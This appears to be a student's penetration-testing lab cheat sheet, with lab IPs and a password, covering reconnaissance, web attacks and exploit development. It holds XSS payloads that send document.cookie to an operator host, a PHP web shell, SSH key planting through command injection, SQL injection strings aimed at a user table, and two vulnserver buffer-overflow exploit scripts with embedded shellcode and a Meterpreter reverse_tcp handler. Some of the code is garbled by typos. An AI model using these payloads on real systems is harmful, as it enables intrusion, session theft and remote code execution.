http://10.50.22.9:8000/ - ctfd 
10.50.34.208- grey 
QjnK39dDzI8iYsH password(cancer) 



------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                       Reconnaissance
------------------------------------------------------------------------------------------------------------------------------------------------------------
HTML/websites:
scraper:
 
import lxml.html 
import requests 


page = requests.get('http://quotes.toscrape.com') 
tree = lxml.html.fromstring(page.content) 

results = tree.xpath('//small[@class="author"]/text()') 

print("Results: ", results) 


host enum:
nmap -Pn -T4 --min--rate 32479827348441 10.50.27.95 -p22,80,8080,2222,4444

ping sweep: 
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done


nmap scripts: 
--script=banner.nse 
--script=http.enum.nse 
--script=smb-os-discovery 
--script

run on op station 
<script>document.location="http://OPIP:8000"+document.cookie;</script> 
python3 -m http.server




<script> document.location="http://SEVERIP/uploads/cookie_stealer.php? username ="+document.cookie;</script> 






<HTML><BODY> 
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd"> 
<INPUT TYPE="submit" VALUE="send"> 
</FORM> 
<?php 
if($_GET['cmd']) {
system($_GET['cmd])
} 
?>
</pre> 
</BODY></HTML> 



ssh-keygen -t rsa -b 4096 
upload public key to .ssh via command injection 
ssh -I ~/.ssh/id_rsa WWWDATA@ip 









------------------------------------------------------------------------------------------------------------------------------------------------------------



mysql
-starts sql

show databases;
-show data

show tables from session;
-show specific table from database

select * from session.Tires;
-select everything from a session

select tireid,name,cost from seesion.Tires;
-shows specific columns from session

use session;
-go into session
  select * from Tires;
  

-character entries are in quotes by default and can be broken by adding your own quotes

User' OR '1=1

http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3
-find feilds available abd what order they display

Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns

User guide .columns in reasouce

Selection=2 UNION select name,type,cost from session.car;#

Selection=2 UNION select id,pass,name from session.user;#

xfreerdp /u:student /v:IP_Address /dynamic-resolution +glyph-cache +clipboard


0xff, oxe4, check for these q
find /b end of stack, beginning of stack, 0xff, 0xe4 
-----------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          overflowing da buffer 
-----------------------------------------------------------------------------------------------------------------------------------------------------------
run the program
see if u can overflow the program 
use gdb to analize the program (pdisass main) look for getuserinput
pdisass getuserinput, look for red one and find vuln - function gets,
grab pattern from wiremask.eu, insert into overflow, copy eip and put in back into to find offset 
make sure you have control of the eip (bunca As and Bs) 
env - gdb name of program or file program 
unset env LINES and unset env COLOUMNS 
info proc map to find start and end of stack(one above stack and one below heap has to be first ) 
find /b end of stack, beginning of stack, 0xff, 0xe4 
copy bunca addrs 
enter in code 
reverse it into eip 
make sure nop is sled 
gen shell code - msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
paste buf into code 




import socket
buf = "TRUN /.:/"
buf += "A" * 5000
buf += "\xAF\X11\Xx50\x62"
buf += "\x90" * 10 
buf += b"\xbb\xf4\x55\x37\x10\xda\xd0\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x59\x83\xc7\x04\x31\x5f\x10\x03\x5f\x10\x16"
buf += b"\xa0\xcb\xf8\x59\x4b\x34\xf9\x05\x7d\xe6\x9d\x4e\x2f"
buf += b"\x36\xd5\x02\xdc\xbf\x0c\x29\x8e\xab\xc1\x9a\x65\xf2"
buf += b"\x56\x96\x51\xcb\x97\x67\x62\x87\x54\xe6\x1e\xda\x88"
buf += b"\xc8\x1f\x15\xdd\x09\x67\xe3\xab\xe6\x35\x7f\x01\xe8"
buf += b"\xee\xf4\xe4\x34\x10\xdb\x62\x04\x6a\x5e\xb4\xf0\xc6"
buf += b"\x61\xe5\x73\x9e\x79\x55\x08\x47\x5a\x54\xdd\xfd\x53"
buf += b"\x22\xdd\xb4\x52\x34\x96\x73\x1e\xcb\x7e\x4a\xe0\x0d"
buf += b"\xb1\xa0\x4c\x8c\x8a\x83\x6c\xfa\xe0\xf7\x11\xfd\x33"
buf += b"\x85\xcd\x88\xa3\x2d\x85\x2b\x07\xcf\x4a\xad\xcc\xc3"
buf += b"\x27\xb9\x8a\xc7\xb6\x6e\xa1\xfc\x33\x91\x65\x75\x07"
buf += b"\xb6\xa1\xdd\xd3\xd7\xf0\xbb\xb2\xe8\xe2\x64\x6a\x4d"
buf += b"\x69\x86\x7d\xf1\x92\x58\x82\xaf\x04\x94\x4f\x50\xd4"
buf += b"\xb2\xd8\x23\xe6\x1d\x73\xac\x4a\xd5\x5d\x2b\xdb\xf1"
buf += b"\x5d\xe3\x63\x91\xa3\x04\x93\xbb\x67\x50\xc3\xd3\x4e"
buf += b"\xd9\x88\x23\x6e\x0c\x24\x2e\xf8\xa5\x8a\x37\xa2\xd1"
buf += b"\xe8\x47\x47\x91\x65\xa1\x37\x85\x25\x7e\xf8\x75\x85"
buf += b"\x2e\x90\x9f\x0a\x10\x80\x9f\xc1\x39\x2b\x70\xbf\x12"
buf += b"\xc4\xe9\x9a\xe9\x75\xf5\x31\x94\xb6\x7d\xb3\x68\x78"
buf += b"\x76\xb6\x7a\x6d\xe1\x38\x83\x6e\x84\x38\xe9\x6a\x0e"
buf += b"\x6f\x85\x70\x77\x47\x0a\x8a\x52\xd4\x4d\x74\x23\xec"
buf += b"\x26\x43\xb1\x50\x51\xac\x55\x50\xa1\xfa\x3f\x50\xc9"
buf += b"\x5a\x64\x03\xec\xa4\xb1\x30\xbd\x30\x3a\x60\x11\x92"
buf += b"\x52\x8e\x4c\xd4\xfc\x71\xbb\x66\xfa\x8d\x39\x41\xa3"
buf += b"\xe5\xc1\xd1\x53\xf5\xab\xd1\x03\x9d\x20\xfd\xac\x6d"
buf += b"\xc8\xd4\xe4\xe5\x43\xb9\x47\x94\x54\x90\x06\x08\x54"
buf += b"\x17\x93\xbb\x2f\x58\x24\x3c\xd0\x70\x41\x3d\xd0\x7c"
buf += b"\x77\x02\x06\x45\x0d\x45\x9a\xf2\x1e\xf0\xbf\x53\xb5"
buf += b"\xfa\xec\xa4\x9c"
s = socket.socket(socket.AF_INET, socket.SOCK_STEAM) 
s.connect(("10.50.39.10", 9999)) 
print s.revc(1024)
s.send(buff)
s.close()


msfconsole
use multihandler
s import socket
  2 offset = "TRUN /.:/"
  3 offset += "A" * 2003
  4 eip = "\xa0\x12\x50\x62"
  5 nop = "\x90" * 16
  6 buf =  b""
  7 buf += b"\xd9\xcb\xb8\x19\x78\x52\x6b\xd9\x74\x24\xf4\x5b\x29"
  8 buf += b"\xc9\xb1\x59\x31\x43\x19\x03\x43\x19\x83\xeb\xfc\xfb"
  9 buf += b"\x8d\xae\x83\x74\x6d\x4f\x54\xea\xe7\xaa\x65\x38\x93"
 10 buf += b"\xbf\xd4\x8c\xd7\x92\xd4\x67\xb5\x06\xea\xc0\x70\x01"
 11 buf += b"\xc5\xd1\x0e\x3f\x0d\x1c\xd1\x6c\x71\x3f\xad\x6e\xa6"
 12 buf += b"\x9f\x8c\xa0\xbb\xde\xc9\x76\xb1\x0f\x87\xdf\xb2\x9d"
 13 buf += b"\x38\x6b\x86\x1d\x38\xbb\x8c\x1d\x42\xbe\x53\xe9\xfe"
 14 buf += b"\xc1\x83\x41\x74\x89\x3b\xea\xd2\x2a\x3d\x3f\x67\xe3"
 15 buf += b"\x49\x83\x59\x0b\xf8\x70\xad\x78\xfa\x50\xff\xbe\x51"
 16 buf += b"\x9d\xcf\x32\xab\xda\xe8\xac\xde\x10\x0b\x50\xd9\xe3"
 17 buf += b"\x71\x8e\x6c\xf3\xd2\x45\xd6\xd7\xe3\x8a\x81\x9c\xe8"
 18 buf += b"\x67\xc5\xfa\xec\x76\x0a\x71\x08\xf2\xad\x55\x98\x40"
 19 buf += b"\x8a\x71\xc0\x13\xb3\x20\xac\xf2\xcc\x32\x08\xaa\x68"
 20 buf += b"\x39\xbb\xbd\x0d\xc2\x43\xc2\x53\x54\x8f\x0f\x6c\xa4"
 21 buf += b"\x87\x18\x1f\x96\x08\xb3\xb7\x9a\xc1\x1d\x4f\xab\xc6"
 22 buf += b"\x9d\x9f\x13\x86\x63\x20\x63\x8e\xa7\x74\x33\xb8\x0e"
 23 buf += b"\xf5\xd8\x38\xae\x20\x74\x33\x38\xc1\xba\x5a\xe2\xbd"
 24 buf += b"\xb8\x5c\x07\x8d\x35\xba\x77\xa1\x15\x13\x38\x11\xd5"
 25 buf += b"\xc3\xd0\x7b\xda\x3c\xc0\x83\x31\x55\x6b\x6c\xef\x0d"
 26 buf += b"\x04\x15\xaa\xc6\xb5\xda\x61\xa3\xf6\x51\x83\x53\xb8"
 27 buf += b"\x91\xe6\x47\xad\xc5\x08\x98\x2e\x60\x08\xf2\x2a\x22"
 28 buf += b"\x5f\x6a\x31\x13\x97\x35\xca\x76\xa4\x32\x34\x07\x9c"
 29 buf += b"\x49\x03\x9d\xa0\x25\x6c\x71\x20\xb6\x3a\x1b\x20\xde"
 30 buf += b"\x9a\x7f\x73\xfb\xe4\x55\xe0\x50\x71\x56\x50\x04\xd2"
 31 buf += b"\x3e\x5e\x73\x14\xe1\xa1\x56\x26\xe6\x5d\x24\x01\x4f"
 32 buf += b"\x35\xd6\x11\x6f\xc5\xbc\x91\x3f\xad\x4b\xbd\xb0\x1d"
 33 buf += b"\xb3\x14\x99\x35\x3e\xf9\x6b\xa4\x3f\xd0\x2a\x78\x3f"
 34 buf += b"\xd7\xf6\x8b\x3a\x98\x09\x6c\xbb\xb0\x6d\x6d\xbb\xbc"
 35 buf += b"\x93\x52\x6d\x85\xe1\x95\xad\xb2\xfa\xa0\x90\x93\x90"
 36 buf += b"\xca\x87\xe4\xb0"
 37 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 38 s.connect(("10.50.39.109", 9999))
 39 print s.recv(1024)
 40 s.send(offset + eip + nop + buf )
 41 s.close()
et payload windows/meterpreter/reverse_tcp 
set lhost 0.0.0.0
set lport 5555

